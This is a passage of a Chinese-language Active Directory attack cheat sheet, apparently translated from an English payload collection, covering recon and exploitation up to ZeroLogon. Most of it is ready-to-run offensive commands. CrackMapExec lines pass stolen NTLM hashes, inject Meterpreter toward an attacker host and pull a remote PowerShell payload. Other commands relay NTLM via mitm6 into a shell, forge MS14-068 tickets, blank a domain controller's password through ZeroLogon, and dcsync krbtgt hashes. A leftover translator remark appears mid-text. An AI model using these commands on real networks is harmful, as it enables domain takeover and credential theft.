# AD域攻击

## 摘要

- [AD域攻击](#active-directory-attacks)
  - [摘要](#summary)
  - [工具](#tools)
  - [Kerberos时钟同步](#kerberos-clock-synchronization)
  - [AD域侦察](#active-directory-recon)
    - [使用BloodHound](#using-bloodhound)
    - [使用PowerView](#using-powerview)
    - [使用AD模块](#using-ad-module)
  - [从CVE到DC上的SYSTEM shell](#from-cve-to-system-shell-on-dc)
    - [MS14-068校验和验证](#ms14-068-checksum-validation)
    - [ZeroLogon](#zerologon)
    - [PrintNightmare](#printnightmare)
    - [samAccountName欺骗](#samaccountname-spoofing)
  - [开放共享](#open-shares)
  - [针对可写共享的SCF和URL文件攻击](#scf-and-url-file-attack-against-writeable-share)
    - [SCF文件](#scf-files)
    - [URL文件](#url-files)
    - [Windows库文件](#windows-library-files)
    - [Windows搜索连接器文件](#windows-search-connectors-files)
  - [SYSVOL和组策略首选项中的密码](#passwords-in-sysvol-&-group-policy-preferences)
  - [利用组策略对象GPO](#exploit-group-policy-objects-gpo)
    - [查找易受攻击的GPO](#find-vulnerable-gpo)
    - [使用SharpGPOAbuse滥用GPO](#abuse-gpo-with-sharpgpoabuse)
    - [使用PowerGPOAbuse滥用GPO](#abuse-gpo-with-powergpoabuse)
    - [使用pyGPOAbuse滥用GPO](#abuse-gpo-with-pygpoabuse)
    - [使用PowerView滥用GPO](#abuse-gpo-with-powerview)
    - [使用StandIn滥用GPO](#abuse-gpo-with-standin)
  - [转储AD域凭据](#dumping-ad-domain-credentials)
    - [DCSync攻击](#dcsync-attack)
    - [卷影复制](#volume-shadow-copy)
    - [从ntds.dit提取哈希](#extract-hashes-from-ntdsdit)
    - [使用Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
    - [使用hashcat破解NTLM哈希](#crack-ntlm-hashes-with-hashcat)
    - [NTDS可逆加密](#ntds-reversible-encryption)
  - [用户狩猎](#user-hunting)
  - [密码喷洒](#password-spraying)
    - [Kerberos预认证暴力破解](#kerberos-pre-auth-bruteforcing)
    - [喷洒预生成的密码列表](#spray-a-pre-generated-passwords-list)
    - [针对RDP服务喷洒密码](#spray-passwords-against-the-rdp-service)
    - [BadPwdCount属性](#badpwdcount-attribute)
  - [AD用户注释中的密码](#password-in-ad-user-comment)
  - [预先创建的计算机账户的密码](#password-of-pre-created-computer-account)
  - [读取LAPS密码](#reading-laps-password)
  - [读取GMSA密码](#reading-gmsa-password)
  - [伪造Golden GMSA](#forging-golden-gmsa)
  - [Kerberos票证](#kerberos-tickets)
    - [转储Kerberos票证](#dump-kerberos-tickets)
    - [重播Kerberos票证](#replay-kerberos-tickets)
    - [转换Kerberos票证](#convert-kerberos-tickets)
    - [传递票证Golden票证](#pass-the-ticket-golden-tickets)
      - [使用Mimikatz](#using-mimikatz)
      - [使用Meterpreter](#using-meterpreter)
      - [在Linux上使用票证](#using-a-ticket-on-linux)
    - [传递票证Silver票证](#pass-the-ticket-silver-tickets)
    - [传递票证Diamond票证](#pass-the-ticket-diamond-tickets)
    - [传递票证Sapphire票证](#pass-the-ticket-sapphire-tickets)
  - [Kerberoasting](#kerberoasting)
  - [KRB_AS_REP Roasting](#krb_as_rep-roasting)
  - [无需域账户的Kerberoasting](#kerberoasting-wo-domain-account)
  - [CVE-2022-33679](#cve-2022-33679)
  - [Timeroasting](#timeroasting)
  - [传递哈希](#pass-the-hash)
  - [OverPass-the-Hash（传递密钥）](#overpass-the-hash-pass-the-key)
    - [使用impacket](#using-impacket)
    - [使用Rubeus](#using-rubeus)
  - [捕获并破解Net-NTLMv1/NTLMv1哈希](#capturing-and-cracking-net-ntlmv1ntlmv1-hashes)
  - [捕获并破解Net-NTLMv2/NTLMv2哈希](#capturing-and-cracking-net-ntlmv2ntlmv2-hashes)
  - [中间人攻击与重放](#man-in-the-middle-attacks--relaying)
    - [MS08-068 NTLM反射](#ms08-068-ntlm-reflection)
    - [不需要LDAP签名且LDAP通道绑定禁用](#ldap-signing-not-required-and-ldap-channel-binding-disabled)
    - [SMB签名禁用和IPv4](#smb-signing-disabled-and-ipv4)
    - [SMB签名禁用和IPv6](#smb-signing-disabled-and-ipv6)
    - [丢弃MIC](#drop-the-mic)
    - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
    - [RemotePotato0 DCOM DCE RPC重放](#remotepotato0-dcom-dce-rpc-relay)
    - [DNS投毒 - 使用mitm6进行委派重放](#dns-poisonning---relay-delegation-with-mitm6)
    - [使用WebDav技巧进行重放](#relaying-with-webdav-trick)
  - [AD域证书服务](#active-directory-certificate-services)
    - [ESC1 - 配置错误的证书模板](#esc1---misconfigured-certificate-templates)
    - [ESC2 - 配置错误的证书模板](#esc2---misconfigured-certificate-templates)
    - [ESC3 - 配置错误的注册代理模板](#esc3---misconfigured-enrollment-agent-templates)
    - [ESC4 - 访问控制漏洞](#esc4---access-control-vulnerabilities)
    - [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6---editf_attributesubjectaltname2)
    - [ESC7 - 易受攻击的证书颁发机构访问控制](#esc7---vulnerable-certificate-authority-access-control)
    - [ESC8 - AD CS重放攻击](#esc8---ad-cs-relay-attack)
    - [ESC9 - 无安全扩展](#esc9---no-security-extension)
    - [ESC11 - 将NTLM重放到ICPR](#esc11---relaying-ntlm-to-icpr)
    - [Certifried CVE-2022-26923](#certifried-cve-2022-26923)
    - [传递证书](#pass-the-certificate)
  - [UnPAC哈希](#unpac-the-hash)
  - [影子凭据](#shadow-credentials)
  - [AD域组](#active-directory-groups)
    - [危险的内置组使用](#dangerous-built-in-groups-usage)
    - [滥用DNS管理员组](#abusing-dns-admins-group)
    - [滥用架构管理员组](#abusing-schema-admins-group)
    - [滥用备份操作员组](#abusing-backup-operators-group)
  - [AD域联合服务](#active-directory-federation-services)
    - [ADFS - Golden SAML](#adfs---golden-saml)
  - [AD域集成DNS](#active-directory-integrated-dns)
  - [滥用AD域ACLs/ACEs](#abusing-active-directory-aclsaces)
    - [GenericAll](#genericall)
    - [GenericWrite](#genericwrite)
      - [GenericWrite和远程连接管理器](#genericwrite-and-remote-connection-manager)
    - [WriteDACL](#writedacl)
    - [WriteOwner](#writeowner)
    - [ReadLAPSPassword](#readlapspassword)
    - [ReadGMSAPassword](#readgmsapassword)
    - [ForceChangePassword](#forcechangepassword)
  - [DCOM利用](#dcom-exploitation)
    - [通过MMC应用程序类DCOM](#dcom-via-mmc-application-class) 
    - [通过Excel DCOM](#dcom-via-excel)
    - [通过ShellExecute DCOM](#dcom-via-shellexecute)
  - [域之间的信任关系](#trust-relationship-between-domains)
  - [子域到林妥协 - SID劫持](#child-domain-to-forest-compromise---sid-hijacking)
  - [林到林妥协 - 信任票证](#forest-to-forest-compromise---trust-ticket)
  - [特权访问管理(PAM)信任](#privileged-access-management-pam-trust)
  - [Kerberos无约束委派](#kerberos-unconstrained-delegation)
    - [通过无约束委派滥用SpoolService](#spoolservice-abuse-with-unconstrained-delegation)
    - [通过无约束委派滥用MS-EFSRPC](#ms---efsrpc-abuse-with-unconstrained-delegation)
  - [Kerberos约束委派](#kerberos-constrained-delegation)
  - [基于资源的Kerberos约束委派](#kerberos-resource-based-constrained-delegation)
  - [Kerberos用户服务扩展](#kerberos-service-for-user-extension)
    - [S4U2self - 权限提升](#s4u2self---privilege-escalation)
  - [Kerberos Bronze Bit攻击 - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
  - [PrivExchange攻击](#privexchange-attack)
  - [SCCM部署](#sccm-deployment)
  - [SCCM网络访问账户](#sccm-network-access-accounts)
  - [SCCM共享](#sccm-shares)
  - [WSUS部署](#wsus-deployment)
  - [RODC - 只读域控制器](#rodc---read-only-domain-controller)
    - [RODC Golden Ticket](#rodc-golden-ticket)
    - [RODC密钥列表攻击](#rodc-key-list-attack)
    - [RODC计算机对象](#rodc-computer-object)
  - [PXE启动映像攻击](#pxe-boot-image-attack)
  - [DSRM凭据](#dsrm-credentials)
  - [DNS侦察](#dns-reconnaissance)
  - [LinuxAD域](#linux-active-directory)
    - [从/tmp重用CCACHE票证](#ccache-ticket-reuse-from-tmp)
    - [从keyring重用CCACHE票证](#ccache-ticket-reuse-from-keyring)
    - [从SSSD KCM重用CCACHE票证](#ccache-ticket-reuse-from-sssd-kcm)
    - [从keytab重用CCACHE票证](#ccache-ticket-reuse-from-keytab)
    - [从/etc/krb5.keytab提取账户](#extract-accounts-from-etckrb5keytab)
    - [从/etc/sssd/sssd.conf提取账户](#extract-accounts-from-etcsssdsssdconf)
  - [参考资料](#references)

## 工具

* [Impacket](https://github.com/CoreSecurity/impacket) 或 [Windows版本](https://github.com/maaaaz/impacket-examples-windows)
* [Responder](https://github.com/lgandx/Responder)
* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Ranger](https://github.com/funkandwagnalls/ranger)
* [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
* [CrackMapExec](https://github.com/mpgn/CrackMapExec)

```powershell
# use the latest release, CME is now a binary packaged will all its dependencies
root@payload$ wget https://github.com/mpgn/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip

# execute cme (smb, winrm, mssql, ...)
root@payload$ cme smb -L
root@payload$ cme smb -M name_module -o VAR=DATA
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
root@payload$ cme mimikatz --server http --server-port 80
```

* [Mitm6](https://github.com/fox-it/mitm6.git)

  ```bash
  git clone https://github.com/fox-it/mitm6.git && cd mitm6
  pip install .
  mitm6 -d lab.local
  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
  # -wh: Server hosting WPAD file (Attacker’s IP)
  # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
  # -i: open an interactive shell
  ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
  ```

* [ADRecon](https://github.com/sense-of-security/ADRecon)

  ```powershell
  .\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
  ```

* [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
    ```

* [Ping Castle](https://github.com/vletoux/pingcastle)

    ```powershell
    pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
    pingcastle.exe --healthcheck --server domain.local
    pingcastle.exe --graph --server domain.local
    pingcastle.exe --scanner scanner_name --server domain.local
    available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users
    ```

* [Kerbrute](https://github.com/ropnop/kerbrute)

    ```powershell
    ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
    ```

* [Rubeus](https://github.com/GhostPack/Rubeus)

    ```powershell
    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
    Rubeus.exe klist [/luid:LOGINID]
    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
    ```

* [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab)
    ```powershell
    New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
    Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'
    Install-Lab
    Show-LabDeploymentSummary
    ```

## Kerberos时钟同步

在Kerberos中，时间用于确保票证的有效性。为了实现这一点，域中所有Kerberos客户端和服务器的时钟必须同步到一定的容差范围内。Kerberos默认的时钟偏斜容忍度为`5分钟`，这意味着任何两个Kerberos实体之间的时钟差异不应超过5分钟。

* 使用`nmap`自动检测时钟偏斜

  ```powershell
  $ nmap -sV -sC 10.10.10.10
  clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
  ```

* 自己计算时钟之间的差异

  ```ps1
  nmap -sT 10.10.10.10 -p445 --script smb2-time -vv
  ```

* 修复方法#1：修改你的时钟

  ```ps1
  sudo date -s "14 APR 2015 18:25:16" # Linux
  net time /domain /set # Windows
  ```

* 修复方法#2：伪造你的时钟

  ```ps1
  faketime -f '+8h' date
  ```

## AD域侦察

### 使用BloodHound

使用正确的收集器

* AzureHound用于AzureAD域

* SharpHound用于本地AD域

* RustHound用于本地AD域

* 使用[BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound)（更多信息：[云 - Azure渗透测试](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md#azure-recon-tools)）

* 使用[BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

  ```powershell
  # 在机器上使用SharpHound.exe运行收集器
  # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
  # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
  .\SharpHound.exe -c all -d active.htb --searchforest
  .\SharpHound.exe -c all,GPOLocalGroup # 默认情况下，所有收集不包括GPOLocalGroup
  .\SharpHound.exe --CollectionMethod DCOnly # 仅从DC收集，不查询计算机（更隐蔽）
  
  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100 -d active.htb
  .\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
  
  # 或在机器上使用Powershell运行收集器
  # https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
  # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
  
  # 或通过BloodHound Python远程运行
  # https://github.com/fox-it/BloodHound.py
  pip install bloodhound
  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
  
  # 或从SysInternals的ADExplorer快照中本地/远程运行（ADExplorer仍然是微软签名的合法二进制文件，可以避免安全解决方案的检测）
  # https://github.com/c3c/ADExplorerSnapshot.py
  pip3 install --user .
  ADExplorerSnapshot.py <snapshot path> -o <*.json output folder path>
  ```

* 使用Certipy收集更多数据以进行证书利用

  ```ps1
  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -bloodhound
  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -old-bloodhound
  certipy find 'corp.local/john:Passw0rd@dc.corp.local' -vulnerable -hide-admins -username user@domain -password Password123
  ```

* 使用[OPENCYBER-FR/RustHound](https://github.com/OPENCYBER-FR/RustHound)

  ```ps1
  # Windows与GSSAPI会话
  rusthound.exe -d domain.local --ldapfqdn domain
  # Windows/Linux简单绑定连接 用户名:密码
  rusthound.exe -d domain.local -u user@domain.local -p Password123 -o output -z
  # Linux与用户名:密码和ADCS模块用于@ly4k BloodHound版本
  rusthound -d domain.local -u 'user@domain.local' -p 'Password123' -o /tmp/adcs --adcs -z
  ```

然后导入zip/json文件到Neo4J数据库并查询它们。

```powershell
root@payload$ apt install bloodhound 

# 启动BloodHound和数据库
root@payload$ neo4j console
# 或使用docker
root@payload$ docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/bloodhound -v $(pwd)/neo4j:/data neo4j:4.4-community

root@payload$ ./bloodhound --no-sandbox
访问http://127.0.0.1:7474，使用数据库:bolt://localhost:7687，用户:neo4J，密码:neo4j
```

你可以添加一些自定义查询，如：

* [来自@hausec的Bloodhound自定义查询](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
* [来自CompassSecurity的BloodHound查询](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)
* [来自Exegol - @ShutdownRepo的BloodHound自定义查询](https://raw.githubusercontent.com/ShutdownRepo/Exegol/master/sources/bloodhound/customqueries.json)
* [来自ly4k的Certipy BloodHound自定义查询](https://github.com/ly4k/Certipy/blob/main/customqueries.json)

替换位于`/home/username/.config/bloodhound/customqueries.json`或`C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json`的自定义查询文件。

基于文档内容，以下是上述命令和描述的全中文翻译：

### 使用PowerView

- **获取当前域：** `Get-NetDomain`

- **枚举其他域：** `Get-NetDomain -Domain <DomainName>`

- **获取域SID：** `Get-DomainSID`

- **获取域策略：**

  ```powershell
  Get-DomainPolicy
  
  #显示域的系统访问或kerberos策略配置
  (Get-DomainPolicy)."system access"
  (Get-DomainPolicy)."kerberos policy"
  ```

- **获取域控制器：**

  ```powershell
  Get-NetDomainController
  Get-NetDomainController -Domain <DomainName>
  ```

- **枚举域用户：**

  ```powershell
  Get-NetUser
  Get-NetUser -SamAccountName <user> 
  Get-NetUser | select cn
  Get-UserProperty
  
  #检查最后一次密码更改
  Get-UserProperty -Properties pwdlastset
  
  #获取用户属性上的特定“字符串”
  Find-UserField -SearchField Description -SearchTerm "wtver"
  
  #枚举机器上登录的用户
  Get-NetLoggedon -ComputerName <ComputerName>
  
  #枚举机器的会话信息
  Get-NetSession -ComputerName <ComputerName>
  
  #枚举当前/指定域中特定用户登录的域机器
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```

- **枚举域计算机：**

  ```powershell
  Get-NetComputer -FullData
  Get-DomainGroup
  
  #枚举存活机器
  Get-NetComputer -Ping
  ```

- **枚举组和组成员：**

  ```powershell
  Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
  
  #枚举域中指定组的成员
  Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
  
  #返回域中通过限制组或组策略首选项修改本地组成员身份的所有GPO
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

- **枚举共享：**

  ```powershell
  #枚举域共享
  Find-DomainShare
  
  #枚举当前用户有权访问的域共享
  Find-DomainShare -CheckShareAccess
  ```

- **枚举组策略：**

  ```powershell
  Get-NetGPO
  
  # 显示指定机器上的活动策略
  Get-NetGPO -ComputerName <Name of the PC>
  Get-NetGPOGroup
  
  #获取属于机器本地管理员组的用户
  Find-GPOComputerAdmin -ComputerName <ComputerName>
  ```

- **枚举OUs：**

  ```powershell
  Get-NetOU -FullData 
  Get-NetGPO -GPOname <The GUID of the GPO>
  ```

- **枚举ACLs：**

  ```powershell
  # 返回与指定账户关联的ACLs
  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
  
  #搜索有趣的ACEs
  Invoke-ACLScanner -ResolveGUIDs
  
  #检查与指定路径（例如smb共享）关联的ACLs
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```

- **枚举域信任：**

  ```powershell
  Get-NetDomainTrust
  Get-NetDomainTrust -Domain <DomainName>
  ```

- **枚举林信任：**

  ```powershell
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>
  
  #林域枚举
  Get-NetForestDomain
  Get-NetForestDomain Forest <ForestName>
  
  #映射林的信任
  Get-NetForestTrust
  Get-NetDomainTrust -Forest <ForestName>
  ```

- **用户狩猎：**

  ```powershell
  #在当前域中找到所有当前用户具有本地管理员访问权限的机器
  Find-LocalAdminAccess -Verbose
  
  #在域的所有机器上查找本地管理员
  Invoke-EnumerateLocalAdmin -Verbose
  
  #查找域管理员或指定用户在哪些计算机上有会话
  Invoke-UserHunter
  Invoke-UserHunter -GroupName "RDPUsers"
  Invoke-UserHunter -Stealth
  
  #确认管理员访问权限：
  Invoke-UserHunter -CheckAccess
  ```

  :heavy_exclamation_mark: **通过用户狩猎提升到域管理员权限：** \
  我在一台机器上有本地管理员访问权限 -> 一个域管理员在那台机器上有会话 -> 我窃取了他的令牌并冒充他 ->   
  成功！

  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### 使用AD模块

- **获取当前域：** `Get-ADDomain`

- **枚举其他域：** `Get-ADDomain -Identity <Domain>`

- **获取域SID：** `Get-DomainSID`

- **获取域控制器：**

  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```

- **枚举域用户：**

  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *
  
  #获取用户属性上的特定“字符串”
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```

- **枚举域计算机：**

  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter * 
  ```

- **枚举域信任：**

  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```

- **枚举林信任：**

  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>
  
  #林域枚举
  (Get-ADForest).Domains
  ```

 - **枚举本地AppLocker有效策略：**

 ```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 ```

### 其他有趣的命令

- **查找域控制器**

  ```ps1
  nslookup domain.com
  nslookup -type=srv _ldap._tcp.dc._msdcs.<domain>.com
  nltest /dclist:domain.com
  Get-ADDomainController -filter * | Select-Object name
  gpresult /r
  $Env:LOGONSERVER 
  echo %LOGONSERVER%
  ```

## 从CVE到域控制器的SYSTEM shell

> 有时你会发现一个域控制器没有安装最新的补丁，使用最新的CVE来获得一个SYSTEM shell。如果你在DC上有一个“普通用户”shell，你也可以尝试使用[Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)中列出的方法之一来提升你的权限。

### MS14-068 校验和验证

此漏洞利用需要知道用户的SID，你可以使用`rpcclient`远程获取它，或者如果你有权限访问机器，可以使用`wmi`。

* RPCClient

  ```powershell
  rpcclient $> lookupnames john.smith
  john.smith S-1-5-21-2923581646-3335815371-2872905324-1107 (User: 1)
  ```

* WMI

  ```powershell
  wmic useraccount get name,sid
  Administrator  S-1-5-21-3415849876-833628785-5197346142-500   
  Guest          S-1-5-21-3415849876-833628785-5197346142-501   
  Administrator  S-1-5-21-297520375-2634728305-5197346142-500   
  Guest          S-1-5-21-297520375-2634728305-5197346142-501   
  krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
  lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
  ```

* Powerview

  ```powershell
  Convert-NameToSid high-sec-corp.localkrbtgt
  S-1-5-21-2941561648-383941485-1389968811-502
  ```

* CrackMapExec: `crackmapexec ldap DC1.lab.local -u username -p password -k --get-sid`  

```bash
文档: https://github.com/gentilkiwi/kekeo/wiki/ms14068
```

使用`metasploit`或`pykek`生成票据

```powershell
Metasploit: auxiliary/admin/kerberos/ms14_068_kerberos_checksum
   名称      当前设置                                必需  描述
   ----      ---------------                                --------  -----------
   DOMAIN    LABDOMAIN.LOCAL                                是       域（大写）例如：DEMO.LOCAL
   PASSWORD  P@ssw0rd                                       是       域用户密码
   RHOSTS    10.10.10.10                                    是       目标地址范围或CIDR标识符
   RPORT     88                                             是       目标端口
   超时       10                                             是       建立连接和读取数据的TCP超时
   用户名      lambda                                         是       域用户
   用户SID  S-1-5-21-297520375-2634728305-5197346142-1106  是       域用户SID，例如：S-1-5-21-1755879683-3641577184-3486455962-1000
```

```powershell
# 另一种下载方式：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
$ git clone https://github.com/SecWiki/windows-kernel-exploits
$ python ./ms14-068.py -u <userName>@<domainName> -s <userSid> -d <domainControlerAddr> -p <clearPassword>
$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org
$ python ./ms14-068.py -u john.smith@pwn3d.local -s S-1-5-21-2923581646-3335815371-2872905324-1107 -d 192.168.115.10
$ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.local -p Password1 -s S-1-5-21-2928836948-3642677517-2073454066
-1105
  [+] 构建AS-REQ到msfdc01.metasploitable.local... 完成！
  [+] 发送AS-REQ到msfdc01.metasploitable.local... 完成！
  [+] 从msfdc01.metasploitable.local接收AS-REP... 完成！
  [+] 解析来自msfdc01.metasploitable.local的AS-REP... 完成！
  [+] 为msfdc01.metasploitable.local构建TGS-REQ... 完成！
  [+] 发送TGS-REQ到msfdc01.metasploitable.local... 完成！
  [+] 从msfdc01.metasploitable.local接收TGS-REP... 完成！
  [+] 解析来自msfdc01.metasploitable.local的TGS-REP... 完成！
  [+] 创建ccache文件'TGT_user01@metasploitable.local.ccache'... 完成！
```

然后使用`mimikatz`加载票据。

```powershell
mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
```

#### 缓解措施

* 确保DCPromo过程包括在运行DCPromo之前检查KB3011780安装的补丁QA步骤。执行此检查的快速简便方法是使用PowerShell：get-hotfix 3011780

### ZeroLogon

> CVE-2020-1472

Secura的白皮书：https://www.secura.com/pathtoimg.php?id=2055

白皮书中的利用步骤

1. 伪造客户端凭据
2. 禁用签名和密封
3. 伪造调用
4. 将计算机的AD密码更改为空
5. 从密码更改到域管理员
6. :warning: 以正确的方式重置计算机的AD密码以避免任何服务拒绝

* `cve-2020-1472-exploit.py` - 来自[dirkjanm](https://github.com/dirkjanm)的Python脚本

  ```powershell
  # 检查（https://github.com/SecuraBV/CVE-2020-1472）
  proxychains python3 zerologon_tester.py DC01 172.16.1.5
  
  $ git clone https://github.com/dirkjanm/CVE-2020-1472.git
  
  # 激活虚拟环境以安装impacket
  $ python3 -m venv venv
  $ source venv/bin/activate
  $ pip3 install .
  
  # 利用CVE（https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py）
  proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
  
  # 查找DC的旧NT哈希
  proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
  
  # 从secretsdump恢复密码
  # secretsdump将在最新版本上自动转储纯文本机器密码（十六进制编码）
  # 当转储本地注册表机密时
  python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
  deactivate
  ```

* `nccfsas` - Cobalt strike的.NET二进制文件

  ```powershell
  git clone https://github.com/nccgroup/nccfsas
  # 检查
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
  
  # 重置机器账户密码
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
  
  # 从非域加入的机器测试
  execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
  
  # 现在将密码重置回去
  ```

* `Mimikatz` - 2.2.0 20200917 Post-Zerologon

  

  ```powershell
  privilege::debug
  # 检查CVE
  lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$
  
  # 利用CVE并将计算机账户的密码设置为""
  lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit
  
  # 执行dcsync以提取一些哈希值
  lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
  lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
  
  # 使用提取的域管理员哈希传递哈希
  sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN
  
  # 使用IP地址而不是FQDN来强制使用Windows API的NTLM
  # 将密码重置为Waza1234/Waza1234/Waza1234/
  # https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
  lsadump::postzerologon /target:10.10.10.10 /account:DC01$
  ```

  * `CrackMapExec` - 仅检查

    ```powershell
    crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
    ```

  利用zerologon的第二种方法是通过中继认证。

  这种技术，[由dirkjanm发现](https://dirkjanm.io/a-different-way-of-abusing-zerologon)，需要更多的先决条件，但优点是对服务连续性没有影响。需要的先决条件如下：

  * 一个域账户

